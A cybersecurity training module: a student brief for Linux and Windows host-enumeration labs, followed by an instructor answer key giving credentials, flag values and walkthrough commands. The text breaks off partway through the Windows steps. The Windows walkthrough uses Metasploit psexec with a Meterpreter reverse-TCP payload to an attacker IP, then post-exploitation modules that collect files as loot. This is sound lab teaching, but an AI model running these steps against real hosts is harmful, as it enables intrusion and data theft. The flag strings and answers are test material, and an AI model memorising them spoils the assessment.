# Boar and Bull Student Brief

## Objective

This module develops baseline host-enumeration discipline in standard Linux and Windows environments. Students should build an evidence-based picture of system purpose, services, users, and operational risk indicators before moving into more constrained scenarios.

## Context

You will profile one Linux host and one Windows host using native enumeration evidence before drawing conclusions. Start broad, then narrow only after evidence identifies likely service, account, and configuration targets.

## Tasks

### Linux Server Profiling

### Environment

A standard Linux server (for example Ubuntu or Rocky) is provided with common services and normal shell tooling.

Expected flags: 5.

### Access

|Hostname (expected)|IP address|Username|Password|Connection|
|---|---|---|---|---|
|`boar-11`|20.30.40.11|`badguy`|`badGuy!QAZ1qaz`|SSH (TCP 22)|

### Tasks

1. Enumerate running processes using standard process inspection tools and distinguish expected daemons from custom applications or scripts.
2. Enumerate listening TCP/UDP services and associate ports to likely service roles.
3. Review system and user scheduled execution paths (including cron) and identify what runs, when it runs, and under which privileges.
4. Establish current user and privilege context, then map other user accounts and home-directory artifacts.
5. Perform file and configuration reconnaissance to identify service configuration, application footprint, and potential credential-bearing content.
6. Produce a host-purpose conclusion from the collected evidence and recover all five lab flags discovered during enumeration.

#### Clues and constraints

- Flag artifacts may appear in normal operational locations, including command output, configuration files, and service-related content.
- Evidence quality matters more than command volume; prefer concise commands with clear interpretation.

#### Report and submission

Submit a complete analysis covering process, network, scheduling, user, file/configuration, and conclusion evidence. Begin with a short **Flags** section listing each of the five exact flag strings and where each was recovered (for example, file path, command output, or service/config artifact). Then provide any additional responses required by the module assessment criteria.

### Windows Server Profiling

### Environment

A standard Windows Server environment is provided with common roles and built-in administrative tooling (PowerShell, CMD, and native binaries).

Expected flags: 5.

### Access

|Hostname (expected)|IP address|Username|Password|Connection|
|---|---|---|---|---|
|`bull-12`|20.30.40.12|`badguy`|`1qaz2wsx!QAZ@WSX`|psexec|

### Tasks

1. Enumerate running processes and differentiate system components, installed software, and custom execution.
2. Enumerate active/listening network connections and map key ports to expected services.
3. Review scheduled task activity and identify high-privilege or custom task behavior.
4. Establish user/domain context and enumerate account/session indicators relevant to host operation.
5. Perform file and configuration reconnaissance for web, script, and credential-bearing artifacts.
6. Produce a host-purpose conclusion from the collected evidence and recover all five lab flags discovered during enumeration.

#### Clues and constraints

- Flag artifacts are integrated into realistic host evidence sources rather than isolated challenge-only files.
- Validate conclusions by correlating multiple evidence types whenever possible.

#### Report and submission

Submit a complete analysis covering process, network, scheduled-task, user/domain, file/configuration, and conclusion evidence. Begin with a short **Flags** section listing each of the five exact flag strings and where each was recovered (for example, file path, command output, or service/config artifact). Then provide any additional responses required by the module assessment criteria.

## Submission notes

Follow instructor-provided assessment criteria for exact deliverable format and grading expectations.

## Deliverables / Evidence

- Submit both lab flag sets with exact evidence location for each flag (command output, file path, or configuration artifact).
- Provide Linux and Windows host-purpose conclusions supported by process, network, scheduling, user, and configuration evidence.
- Include one concise evidence chain per host from broad triage to final conclusion.

## Constraints

- Use assigned host, credential, and connection values from instructor/range guidance when they differ from defaults.
- Keep collection evidence-first: avoid jumping to assumptions without process, network, scheduling, account, and config artifacts.
- Preserve student-safe operations; do not use destructive changes to fabricate evidence.

## Success Criteria

You successfully complete this Module when both host profiles include complete flag recovery, defensible host-purpose conclusions, and evidence chains that show disciplined baseline situational awareness in Linux and Windows contexts.

## PCTE range limitations

These limits apply on Persistent Cyber Training Environment (PCTE) ranges used by this Module. Treat the items below as a no-strike list when they exist. Not every item is present on every range or host.

Do not target, block, terminate, or delete range-control artifacts:

- **Network:** `10.0.0.0/8` (range control and instrumentation; do not block or flag that traffic). Routers past the edge-router in grey space. TCP `5672` (AMQP user-emulation on the control subnet), `49998`, and `49999`.
- **Accounts:** `range-admin` / `range_admin`, `range-control`, and `range`. Do not use accounts whose username or password contains `simspace`.
- **User emulation:** do not stop it. Typical paths: `C:\Program Files (x86)\Simspace\` and `C:\Users\<Username>\Simspace`. Scripts: `run-actuation.cmd`, `ueactuation.cmd`.
- **Directories:** `C:\Program Files\Puppet Labs` and the Simspace paths above.
- **Processes:** `java.exe`, `javaw.exe`, `ruby.exe`, `rubyw.exe`, `start.exe`, `chromedriver.exe`, `IEDriverServer.exe`, Metova, Selenium, WebDriver.

# Boar and Bull — Instructor Answer Key

## lab 1.1 answer key

# Lab 1.1 — Linux Server — Answer Key (Instructor Only)

Use this as a live walkthrough. The goal is to start with only the access and tasking given to students, enumerate the host in a sensible order, and naturally uncover all five flags plus the required artifact answers.

Walkthrough commands are the **B03.M01 Situational Awareness, Execution Environments, and User Context** lecture SA baseline, not a closed list from the student packet. The packet is task-level. For additional enumeration commands, use that lecture, ATT&CK Discovery (TA0007), and Linux man pages. Do not treat this key as the only valid command set.

## Access

|Hostname (expected)|IP address|Username|Password|Connection|
|---|---|---|---|---|
|`boar-11`|20.30.40.11|`badguy`|`badGuy!QAZ1qaz`|SSH (TCP 22)|

If the instructor or range card provides a different login, use those assigned values.

## Flag Reference

|Flag ID|Default location in the default build|Hiera key|Default value (if key omitted)|
|---|---|---|---|
|`process_flag`|`/etc/cron.d/syswatch_backup` and, while running, the cron-created process environment|`cs_ops::lab_1_1::flags::process_flag`|`IRON-LANTERN`|
|`log_flag`|`/var/log/syswatch/app.log`|`cs_ops::lab_1_1::flags::log_flag`|`COBALT-TRACE`|
|`user_flag`|`/home/svc_backup/flag.txt` and the `svc_backup` account comment|`cs_ops::lab_1_1::flags::user_flag`|`VELVET-ANCHOR`|
|`port_flag`|Apache response header `X-SysWatch-Status` on localhost-only metrics vhost `127.0.0.1:8081`|`cs_ops::lab_1_1::flags::port_flag`|`SIGNAL-HARBOR`|
|`config_flag`|`connection_secret` in `/var/www/html/db_config.txt`|`cs_ops::lab_1_1::flags::config_flag`|`QUARTZ-VEIL`|

Set each flag under `cs_ops::lab_1_1::flags` in Hiera, for example in `environments/week3_repo/vms/puppet/data/nodes/lab_1_1.yaml`. Defaults are defined in `environments/week3_repo/vms/puppet/modules/cs_ops/manifests/lab_1_1.pp`.

Relevant HTTP-header tunables:

- `cs_ops::lab_1_1::port_flag_header_name` defaults to `X-SysWatch-Status`.
- `cs_ops::lab_1_1::metrics_bind_address` defaults to `127.0.0.1`.
- `cs_ops::lab_1_1::metrics_port` defaults to `8081`.
- `cs_ops::lab_1_1::apache_metrics_site_name` defaults to `syswatch-metrics`, rendered at `/etc/apache2/sites-available/syswatch-metrics.conf` in the default build.

## Recommended Instructor Walkthrough

### 1. Connect and run situational awareness baseline

Connect with the Access table (or range-rotated credentials), then collect the B03.M01 Linux SA baseline before objective-specific enumeration:

```
ssh <student-user>@<lab-ip>
date -u
hostname
whoami
id
groups
sudo -l
pwd
echo "$SHELL"
ps -p $$ -o pid,ppid,args=
env | sort | sed -n '1,20p'
uname -a
cat /etc/os-release
who
w
ps aux
ss -tulpen
ss -tunap
```

Why:

- This is the B03.M01 Linux SA first pass: host orientation before chasing artifacts.
- It establishes remote time, identity, privilege/group context, shell/process context, environment details, OS version, active users, process baseline, and socket baseline.
- Equivalent commands from the lecture, ATT&CK Discovery, or man pages are valid if they prove the same baseline.

What to call out:

- `date -u`, `hostname`, `whoami`, and `id` anchor where and as whom the student is operating.
- `groups` lists supplementary groups (expect `sudo` on the default student login). `sudo -l` lists commands this account may run via `sudo`. Record that now; Step 9 uses it when a file read is denied.
- `echo "$SHELL"` plus `ps -p $$` confirms the active shell/process chain.
- `ss -tulpen` (listeners) and `ss -tunap` (established/active sockets) provide required TCP/UDP baseline evidence.

Expected `groups` excerpt:

```
<student-user> : <student-user> sudo
```

Expected `sudo -l` excerpt (wording varies by sudoers policy; the point is that sudo is allowed):

```
User <student-user> may run the following commands on <hostname>:
    (ALL : ALL) ALL
```

### 2. Enumerate processes first

```
ps aux
top
```

Why:

- `ps aux` gives a broad snapshot of running processes and the users behind them.
- `top` helps distinguish normal background daemons from anything unusual or resource-active. In a live demo, open it briefly and quit with `q`.

What to call out:

- Standard Linux daemons are expected.
- Students may or may not catch the cron-launched `sleep 90` process here because it is short-lived. If it is present, it is useful evidence; if it is absent, that is normal and they should keep enumerating.

Optional validation if the cron job happens to be running:

```
ps eww -u root
```

Why:

- The cron job exports `PROCESS_FLAG` into the process environment. `ps eww` can expose it if the job is active at that moment.

### 3. Check scheduled tasks and recover the process flag

```
ls -lah /etc/cron.d
cat /etc/cron.d/syswatch_backup
```

Why:

- The student packet tasks review of scheduled execution, including cron. `ls /etc/cron.d` is the standard Linux drop-in path from ordinary admin practice, not a packet-named file.
- This is the most reliable way to answer who runs the custom job, when it runs, and what it executes.
- Students know to read `/etc/cron.d/syswatch_backup` only after the directory listing exposes it as a non-default, purpose-named scheduler artifact. Additional cron locations (`/etc/crontab`, user `crontab -l`, `/etc/cron.*`) are in `man cron` / `man crontab`.

Expected `cat /etc/cron.d/syswatch_backup` output:

```
# Cron job for assessment: process enumeration (flag in process env; visible via ps e or /proc/*/environ)
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/5 * * * * root env PROCESS_FLAG="IRON-LANTERN" sleep 90 || true
```

Expected findings:

- The custom cron file is `/etc/cron.d/syswatch_backup`.
- The schedule is `*/5 * * * *` by default.
- The job runs as `root`.
- The command includes `env PROCESS_FLAG="IRON-LANTERN" sleep 90 || true`.

Flag recovered:

- `process_flag` = `IRON-LANTERN` by default.

Teaching point:

- This is a good moment to explain that "process enumeration" is not only `ps`; it includes the scheduled task definitions that create processes.

### 4. Review logs and recover the log flag

```
ls -lah /var/log
ls -lah /var/log/syswatch
cat /var/log/syswatch/app.log
```

Why:

- Students are asked to inspect logs and determine what looks operationally significant.
- The custom log directory stands out quickly once they leave only-default locations behind.
- It also reuses the same `syswatch` name already seen on the custom cron file `/etc/cron.d/syswatch_backup`. That name correlation is the reason to treat `/var/log/syswatch` as the operational log for this host, not a random extra folder.
- The broad `/var/log` listing is the evidence that justifies narrowing into `/var/log/syswatch`; instructors should point to that discovery (and the cron name match) before reading the file.

Expected `cat /var/log/syswatch/app.log` output:

```
[2024-01-15 12:00:00] Backup completed by svc_backup. COBALT-TRACE
```

Expected findings:

- The log entry includes the log flag.
- The relevant user named in the entry is `svc_backup`.

Flag recovered:

- `log_flag` = `COBALT-TRACE` by default.

Artifact answer:

- The user associated with the log entry is `svc_backup`.

### 5. Enumerate users and recover the user flag

```
cat /etc/passwd
ls -lah /home
getent passwd svc_backup
getent passwd app_runner
ls -lah /home/svc_backup
cat /home/svc_backup/flag.txt
```

Why:

- The student packet tasks account and home-directory mapping after the log named `svc_backup`. `/etc/passwd` and `/home` are the B03.M01 / standard Linux starting points.
- `getent passwd` is a cleaner way to spotlight the specific service accounts after showing the full local user list. Other account tools from man pages are valid.
- Students should identify `svc_backup` and `app_runner` from the full account/home-directory review first; targeted `getent` and file reads are the narrowing step after that evidence.

Expected `getent passwd svc_backup` excerpt:

```
svc_backup:x:<uid>:<gid>:Backup service account - VELVET-ANCHOR:/home/svc_backup:/bin/bash
```

Expected `cat /home/svc_backup/flag.txt` output:

```
VELVET-ANCHOR
```

Expected findings:

- Non-system users should include the student login account plus the lab-created service accounts `svc_backup` and `app_runner`.
- The `svc_backup` account comment includes the user flag in the default build.
- `/home/svc_backup/flag.txt` contains the same flag directly.

Flag recovered:

- `user_flag` = `VELVET-ANCHOR` by default.

Artifact answer:

- The service accounts instructors should expect in the default build are `svc_backup` and `app_runner`, in addition to the student login account configured for the exercise.

### 6. Enumerate listeners

```
ss -tulpn
```

Why:

- `ss -tulpn` is the B03.M01 Linux listener baseline. `-t` TCP, `-u` UDP, `-l` listening, `-p` process, `-n` numeric ports. `ss -lntup` from the lecture, or `netstat` if `ss` is missing, is equivalent.
- Remote scanning should only show the externally reachable service on port `80`; it should not retrieve the port flag because the metrics vhost is bound to loopback.
- Once students SSH into the host, local `ss` evidence should show a listener on `127.0.0.1:8081` in addition to port `80`.
- Hold the loopback listener for Step 7. Hold port `80` for Step 9 web-root reconnaissance.
- As the student login, `ss -p` leaves the process column blank for sockets owned by another user. That is normal. `sudo ss -tulpn` shows `apache2` on `*:80` and `127.0.0.1:8081`. Without sudo, the `Server: Apache` response header (Step 7, and a HEAD or GET to port `80`) is the confirmation that those listeners are Apache.

Expected `ss -tulpn` excerpt as the student login (process column blank):

```
LISTEN ... *:80              *:*
LISTEN ... 127.0.0.1:8081    0.0.0.0:*
```

Expected `sudo ss -tulpn` excerpt:

```
LISTEN ... *:80              *:*          users:(("apache2",...
LISTEN ... 127.0.0.1:8081    0.0.0.0:*    users:(("apache2",...
```

Expected findings:

- Port `22` should be SSH.
- Port `80` should be the externally reachable Apache HTTPD site in the default build.
- `127.0.0.1:8081` should be an Apache metrics portal only available from the host itself after login.

### 7. Look deeper into HTTP response metadata and recover the port flag

```
curl -i http://127.0.0.1:8081/
```

Why:

- Step 6 `ss` already proved a localhost-only HTTP listener on `127.0.0.1:8081`. The loopback address and port come from that listener evidence, not from the answer key.
- `curl -i` includes response headers. The port flag is in Apache-provided header metadata, not in a remotely scannable banner or the public HTML page body.

Expected `curl -i [http://127.0.0.1:8081/](http://127.0.0.1:8081/)` output snippet:

```
HTTP/1.1 200 OK
X-SysWatch-Status: SIGNAL-HARBOR

<!DOCTYPE html>
<html>
<head><title>SysWatch Metrics Portal</title></head>
```

Expected findings:

- The Apache response header `X-SysWatch-Status` on the loopback metrics portal contains the port flag.

Flag recovered:

- `port_flag` = `SIGNAL-HARBOR` by default.

Teaching point:

- The current default lab does **not** place the port flag in a remotely scannable banner or the public HTML page body. Students need host-local listener evidence from Step 6, then HTTP response metadata from the loopback-only Apache metrics portal.

### 8. Identify the active SSH connection

```
ss -tnp
```

Why:

- The student packet tasks live connections, not just listeners. `ss -tnp` is the B03.M01 / standard follow-up after the listener pass.
- After they are connected over SSH, `ss -tnp` should show an established session involving port `22`.

Expected findings:

- The remote address on the `ESTAB` SSH connection is the student's workstation or jump-host IP.

Artifact answer:

- Grade this against the actual source IP visible during the exercise, not a hard-coded value.

### 9. Enumerate application files and recover the config flag

```
ls -lah /var/www/html
ls -lah /var/www/html/db_config.txt
cat /var/www/html/db_config.txt
curl -i http://127.0.0.1/db_config.txt
sudo cat /var/www/html/db_config.txt
```

Why:

- The student packet tasks file and configuration reconnaissance for service configuration. Additional search techniques are in the B03.M01 lecture and `man find`.
- Students know `/var/www/html` is relevant because Step 6 already identified Apache on port `80`; that is a common Apache content root, not a packet-named path. The directory listing then exposes `db_config.txt` as the candidate config artifact.
- `ls -lah` on the file is required before `cat`/`curl`. In the default Puppet build the file is `root:root` mode `0640` (`-rw-r-----`), so the student login cannot read it, and Apache (`www-data`) usually cannot either.
- After the first `cat` `Permission denied`, do not start a privilege-escalation hunt. Go back to Step 1: `groups` already showed `sudo`, and `sudo -l` already showed this account may run commands as root. `sudo cat /var/www/html/db_config.txt` is using that baseline evidence to finish file reconnaissance.
- `curl -i` still matters as a second path: HTTP uses the web-server user, so a `403` matches the same `0640` mode even after you can `sudo cat` the file.

Expected `ls -lah /var/www/html/db_config.txt` excerpt:

```
-rw-r----- 1 root root ... /var/www/html/db_config.txt
```

Expected `cat` as the student (no sudo):

```
cat: /var/www/html/db_config.txt: Permission denied
```

Expected `curl -i [http://127.0.0.1/db_config.txt](http://127.0.0.1/db_config.txt)` snippet when Apache cannot read the file:

```
HTTP/1.1 403 Forbidden
```

Expected `sudo cat /var/www/html/db_config.txt` output:

```
# DB connection (assessment artifact)
db_host=localhost
db_user=syswatch_app
connection_secret=QUARTZ-VEIL
```

Expected findings:

- The file contains a `connection_secret=` line.
- That value is the config flag.

Flag recovered:

- `config_flag` = `QUARTZ-VEIL` by default.

### 10. Close with the "what is this server?" summary

Students should be able to conclude that this is a standard Linux server providing at least:

- SSH access on port `22`
- An Apache-hosted web site on port `80`
- A loopback-only Apache metrics portal on `127.0.0.1:8081`
- A root-owned scheduled backup-style cron job
- Service accounts such as `svc_backup` and `app_runner`
- Operational artifacts in logs and web config files that are discoverable through normal host enumeration

That is the full-system picture the lab is trying to build: processes, ports, cron, users, files, and conclusions tied together into one coherent assessment.

## Troubleshooting and Confirmation

- If SSH fails, confirm the ops-station login, target IP, TCP 22, and Access-table credentials versus any range-rotated values.
- If `sudo` is missing or `db_config.txt` stays `Permission denied`, re-check Step 1 `groups` / `sudo -l`. In the default build the file is `root:root` mode `0640`.
- If `curl` of `db_config.txt` returns `403`, that is expected when Apache cannot read `0640`. `sudo cat` is the disk path; HTTP uses the web-server user.
- If `ps` shows no `sleep 90` job, that is normal. The cron is `*/5`; recover `process_flag` from `/etc/cron.d`, not from process environment timing.
- If a remote scan does not show the port flag, the metrics vhost is loopback-only. Students need host-local listener evidence, then `curl -i` to `127.0.0.1:8081`.
- If recovered flag strings differ from this key, grade the Hiera values on that node, not the defaults table.

## Artifact Answers

1. **Process / scheduled task:** The custom backup cron job runs as `root`.
2. **Logs:** The log entry containing the log flag names `svc_backup`.
3. **Users:** Students should identify the student login account plus `svc_backup` and `app_runner` at minimum in the default build.
4. **Listening ports:** Expect `22/tcp` for SSH, `80/tcp` for the public Apache site, and `127.0.0.1:8081/tcp` for the loopback-only Apache metrics portal in the default build. Grade any other reported listening ports based on the deployed target.
5. **Active connections:** The SSH remote address should be the student's workstation or jump-host IP shown in `ss -tnp`.
6. **Cron schedule:** The default custom cron schedule is `*/5 * * * *`.
7. **Config artifact:** The `connection_secret` value is `QUARTZ-VEIL` by default.

## Acceptable Answers

Accept equivalent correct answers for service names and port descriptions. For flags, require exact string matches unless the exercise instructions explicitly allow partial credit.

## lab 1.2 answer key

# Lab 1.2 — Windows Server — Answer Key (Instructor Only)

Use this as a live walkthrough. The goal is to start with only the access and tasking given to students, enumerate the host with standard Windows tools, and naturally uncover all five flags plus the required artifact answers.

Instructor intent: demonstrate at least two evidence paths where practical (native host commands and Metasploit modules), so students see repeatable collection methods instead of answers based on prior knowledge of the build.

Walkthrough commands are the **B03.M01 Situational Awareness, Execution Environments, and User Context** lecture SA baseline, not a closed list from the student packet. The packet is task-level. For additional enumeration commands, use that lecture, ATT&CK Discovery (TA0007), and Microsoft Learn. Do not treat this key as the only valid command set.

## Access

|Hostname (expected)|IP address|Username|Password|Connection|
|---|---|---|---|---|
|`bull-12`|`20.30.40.12`|`badguy`|`1qaz2wsx!QAZ@WSX`|`psexec`|

If the instructor or range card provides a different login, use those assigned values.

## Flag Reference

|Flag ID|Default location in the default build|Hiera key|Default value (if key omitted)|
|---|---|---|---|
|`process_flag`|Scheduled task action/arguments for `CS_OPS_Backup` and, when active, the PowerShell task process command line|`cs_ops::lab_1_2::flags::process_flag`|`BRAVO-EMBER`|
|`log_flag`|`C:\ProgramData\cs_ops\logs\app.log` (pivot from a running PowerShell command line with `-AppLogPath`)|`cs_ops::lab_1_2::flags::log_flag`|`POLAR-CIPHER`|
|`user_flag`|`svc_backup` local user description and `C:\Users\svc_backup\Desktop\flag.txt`|`cs_ops::lab_1_2::flags::user_flag`|`NIMBUS-KEYSTONE`|
|`port_flag`|IIS HTTP response header `X-Backend-Service` on port `80` (set in `applicationHost.config` under `<location path="Default Web Site">`)|`cs_ops::lab_1_2::flags::port_flag`|`TIDAL-ROUTE`|
|`config_flag`|`connection_secret` in `C:\inetpub\wwwroot\db_config.txt`|`cs_ops::lab_1_2::flags::config_flag`|`OPAL-MATRIX`|

Set each flag under `cs_ops::lab_1_2::flags` in Hiera, for example in `environments/week3_repo/vms/puppet/data/nodes/lab_1_2.yaml`. Defaults are defined in `environments/week3_repo/vms/puppet/modules/cs_ops/manifests/lab_1_2.pp`.

Relevant HTTP-header tunable:

- `cs_ops::lab_1_2::port_flag_header_name` defaults to `X-Backend-Service`. The header is configured at the IIS server-level config file (`C:\Windows\System32\inetsrv\config\applicationHost.config`) under a `<location path="Default Web Site">` block and is served on the externally reachable IIS site. The flag is recovered from HTTP response metadata; nothing in `C:\inetpub\wwwroot` carries it.

## Recommended Instructor Walkthrough

### 1. Gain initial access and establish situational awareness

From the Kali ops VM, use Metasploit to land a Meterpreter session with the Access-table `badguy` credentials (or range-rotated values if assigned):

```
msfconsole
use exploit/windows/smb/psexec
set RHOSTS <target_ip>
set SMBUser badguy
set SMBPass 1qaz2wsx!QAZ@WSX
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker_ip>
run
```

Start inside the Meterpreter session and collect host/session baseline context before chasing any flag:

```
sysinfo
getuid
getpid
shell
# Drops you into a local Windows cmd.exe shell for CLI commands.
hostname
whoami
whoami /all
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
time /t
date /t
net user
tasklist
netstat -ano
powershell -NoProfile
# Spawns PowerShell for PowerShell cmdlets.
Get-Date
$env:ComSpec
[Environment]::GetEnvironmentVariables('Process').GetEnumerator() | Sort-Object Name | Select-Object -First 20
Get-CimInstance Win32_Process -Filter "ProcessId=$PID" | Select-Object ProcessId,ParentProcessId,Name,CommandLine
Get-NetTCPConnection -State Listen,Established | Select-Object -First 40 LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess
Get-NetUDPEndpoint | Select-Object -First 40 LocalAddress,LocalPort,OwningProcess
```

Why:

- This is the B03.M01 Windows SA first pass after the assigned `psexec` path: host orientation before chasing artifacts.
- It anchors remote time, host identity, user/token context, shell/interpreter context, environment details, OS version, active users, process baseline, and listening/established TCP/UDP sockets.
- Equivalent commands from the lecture, ATT&CK Discovery, or Microsoft Learn are valid if they prove the same baseline.

What to call out:

- `getuid`, `whoami`, and `whoami /all` establish whether the session is running with the expected token and privileges.
- Meterpreter `shell` drops the session into a local `cmd.exe` for Windows CLI commands (`hostname`, `tasklist`, `netstat`). `powershell -NoProfile` then spawns PowerShell for cmdlets; `-NoProfile` skips profile scripts so the interpreter starts clean.
- `getpid` plus `Get-CimInstance Win32_Process -Filter "ProcessId=$PID"` ties the current PowerShell shell back to process evidence.
- The initial `tasklist`, `net user`, and socket output are not final answers; they are the map students use to decide where to investigate next.

### 2. Investigate processes and scheduled tasks to recover the process flag

Start broad with running processes:

```
tasklist
Get-Process | Sort-Object ProcessName
Get-CimInstance Win32_Process | Select-Object ProcessId, Name, CommandLine
Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like '*-AppLogPath*' -or $_.CommandLine -like '*-ProcessFlag*' } | Select-Object ProcessId, Name, CommandLine
```

Why:

- `tasklist` provides the broad classic Windows snapshot students are expected to know.
- `Get-Process` gives cleaner PowerShell output for discussion and filtering.
- Full command-line review exposes high-value pivots such as `-AppLogPath` and, if the repeating task is active, `-ProcessFlag`.

Expected process findings:

- Standard Windows service processes will dominate the list.
- If the repeating scheduled task happens to be active, students may catch `powershell.exe` spawned by the custom task, but they should not rely on timing alone.
- A long-running PowerShell whose command line includes `-AppLogPath` is the app-log writer started when Puppet applies the lab. It is not a child of `CS_OPS_Backup`. It is present only until the next reboot. When the filter shows it, hold that path for Step 3. When the filter returns nothing, continue. Step 3 still finds the log under `C:\ProgramData\cs_ops\logs`.

Then review scheduled tasks:

```
schtasks /query /fo LIST /v
schtasks /query /fo LIST
# /v is useful for details, but with many tasks it can blow the buffer or be too much to process.
# Review names first, then pick one to inspect.
schtasks /query /tn CS_OPS_Backup /fo LIST /v
Get-ScheduledTask -TaskName CS_OPS_Backup | Format-List *
Get-ScheduledTask -TaskName CS_OPS_Backup | Select-Object -ExpandProperty Actions
```

Why:

- The student packet tasks scheduled-task review. `schtasks` and `Get-ScheduledTask` are the B03.M01 / standard Windows admin tools, not packet-named binaries. Additional task-query options are in Microsoft Learn.
- This is the Windows analogue to reading the Linux cron file in Lab 1.1.
- `schtasks /query` lists registered tasks. `/fo LIST` prints one field per line instead of a wide table. `/v` adds verbose fields (trigger, run-as user, Task To Run). `/tn` selects one task name.
- Students know the `CS_OPS_Backup` task name from the non-`/v` `schtasks /query /fo LIST` name review; the targeted `/tn` and `Get-ScheduledTask` commands are the evidence-backed narrowing step after that list, not after drowning in a full verbose dump.

Expected scheduled-task findings:

- There is a custom task named `CS_OPS_Backup`.
- It runs as `SYSTEM` (`Run As User: SYSTEM`).
- It launches PowerShell with a `-ProcessFlag` argument that contains the process flag.
- Its `-TaskLogPath` points to the task runtime report log; this path supports the next log-review step but is not the default `log_flag` source.
- Puppet's default start time is `00:00`. On this image, `schtasks /query /tn CS_OPS_Backup /fo LIST /v` shows Start Time `1:00:00 AM`, and `Get-ScheduledTask` shows `StartBoundary` `2024-01-15T01:00:00-04:00`. The task then repeats every `5` minutes for `480` minutes (through `09:00` local). Grade the repeat and the duration. Do not require the `schtasks` clock hour to be the literal string `00:00`.
- Power Management on the default task includes `Stop On Battery Mode, No Start On Batteries`.

Expected task action excerpt:

```
-NoProfile -ExecutionPolicy Bypass -File "C:\ProgramData\cs_ops\scripts\Invoke-CsOpsBackup.ps1" -ProcessFlag "BRAVO-EMBER" -TaskLogPath "C:\ProgramData\Microsoft\Windows\Backup\Reports\WindowsBackup.log"
```

Flag recovered:

- `process_flag` = `BRAVO-EMBER` by default.

Teaching point:

- Process enumeration on Windows is not only `tasklist`; it also includes the scheduled-task definitions that create those processes and expose task-specific artifacts.

Metasploit module options:

```
background
use post/windows/gather/enum_services
set SESSION <meterpreter_session_id>
run

use post/windows/gather/enum_files
set SESSION <meterpreter_session_id>
set SEARCH_FROM C:\\Windows\\System32\\Tasks
set FILE_GLOBS CS_OPS_Backup
run
loot
```

Why:

- `enum_services` gives framework-driven service/process context to compare with `tasklist` and `Get-Process`.
- The scheduled task definition file is an artifact that can be collected directly through a `post` module.
- Reviewing the collected task file provides an alternate way to recover the PowerShell action arguments, including `-ProcessFlag`.

### 3. Follow log evidence and recover the log flag

Use the process and scheduled-task evidence from Step 2 to inspect related logs. Copy quoted paths from `schtasks` / `wmic` output; do not parse them with regex.

```
wmic process get ProcessId,Name,CommandLine /format:list
dir C:\ProgramData
dir C:\ProgramData\cs_ops\logs
type C:\ProgramData\cs_ops\logs\app.log
```

Optional, after Step 2 already printed `-TaskLogPath` on the `CS_OPS_Backup` action:

```
type "C:\ProgramData\Microsoft\Windows\Backup\Reports\WindowsBackup.log"
```

Why:

- `wmic` is Windows Management Instrumentation Command-line. `process` is the `Win32_Process` alias. `get ProcessId,Name,CommandLine` limits the dump to identity plus the command line. Default table output wraps long command lines; `/format:list` prints one field per line so quoted paths are readable.
- When Step 2 shows a live `-AppLogPath` command line, that path is the app log. When it does not, the task action's `-File` path is under `C:\ProgramData\cs_ops\scripts`, and `dir C:\ProgramData` then `cs_ops\logs` is the same discovery step. The writer does not have to be running.
- This keeps the log flag tied to evidence from process and scheduled-task review rather than a pre-announced path or a scripted string parse.

Expected task-log findings (from Step 2 Task To Run / `-TaskLogPath`, optional `type` above):

- The task log is located at `C:\ProgramData\Microsoft\Windows\Backup\Reports\WindowsBackup.log` by default.
- The task log confirms that the scheduled backup-style task executes and receives the process flag argument.
- The task runs as `SYSTEM`. The script records `$env:USERNAME`, so the log line names the computer account (`BULL-12$` on the default hostname), not the word `SYSTEM`.

Expected optional `type` excerpt for the task log:

```
Windows backup report initialized
[<timestamp>] Backup task executed by BULL-12$. Process flag supplied: BRAVO-EMBER
```

Expected app-log findings:

- The app log entry includes the log flag.
- The relevant user named in the entry is `svc_backup`; use that account name in Step 4.
- The application log directory does not contain the scheduled-task runtime log; the two paths are separate evidence sources.

Expected `type C:\ProgramData\cs_ops\logs\app.log` output starts with:

```
[2024-01-15 12:00:00] Backup completed by svc_backup. POLAR-CIPHER
```

Flag recovered:

- `log_flag` = `POLAR-CIPHER` by default.

Artifact answer:

- The user associated with the log entry is `svc_backup`.

Metasploit module option:

```
background
use post/windows/gather/enum_files
set SESSION <meterpreter_session_id>
set SEARCH_FROM <discovered_app_log_parent_dir>
set FILE_GLOBS *.log
run
loot
```

Why:

- The log collection module demonstrates collection of artifacts discovered from process command-line evidence.

### 4. Enumerate users and recover the user flag

Use the `svc_backup` name discovered in the app log as the transition into account review:

```
net user
net user svc_backup
dir C:\Users
dir C:\Users\svc_backup
dir C:\Users\svc_backup\Desktop
type C:\Users\svc_backup\Desktop\flag.txt
```

Why:

- The student packet tasks local-user and user-artifact mapping. Stay in `cmd.exe`. `net user` is the B03.M01 / standard Windows starting point; additional account tools are in Microsoft Learn.
- `net user` lists local accounts. `net user svc_backup` prints that account’s **Comment/Description**, which is where the user flag is embedded by default. Students already ran `net user` in Step 1; this is the narrowing pass after the Step 3 log named `svc_backup`.
- Identify `svc_backup` in the full `net user` list before targeting it. Then `dir C:\Users` → `svc_backup` → `Desktop` and `type` the flag file. The profile walk is justified by the account name plus the `C:\Users` listing.

Expected findings:

- Local users should include the student access account plus service accounts such as `svc_backup` and `app_runner`.
- The `svc_backup` description includes the user flag in the default build.
- `C:\Users\svc_backup\Desktop\flag.txt` contains the same flag directly.

Expected `type C:\Users\svc_backup\Desktop\flag.txt` output:

```
NIMBUS-KEYSTONE
```

Flag recovered:

- `user_flag` = `NIMBUS-KEYSTONE` by default.

Metasploit module options:

```
background
use post/windows/gather/enum_logged_on_users
set SESSION <meterpreter_session_id>
run

use post/windows/gather/enum_files
set SESSION <meterpreter_session_id>
set SEARCH_FROM C:\\Users
set FILE_GLOBS flag.txt
run
loot
```

Why:

- `enum_logged_on_users` gives framework-collected user context to complement `net user`.
- `enum_files` provides a second path to recover `C:\Users\svc_backup\Desktop\flag.txt` when demonstrating repeatable file collection at scale.

### 5. Enumerate listeners and recover the config flag

Return to the network baseline and enumerate listeners:

```
netstat -ano
Get-NetTCPConnection -State Listen | Sort-Object LocalPort | Format-Table -AutoSize
Get-NetUDPEndpoint | Sort-Object LocalPort | Format-Table -AutoSize
Get-Service W3SVC
Get-Process -Id (Get-NetTCPConnection -State Listen | Where-Object LocalPort -eq 80 | Select-Object -First 1 -ExpandProperty OwningProcess)
```

Why:

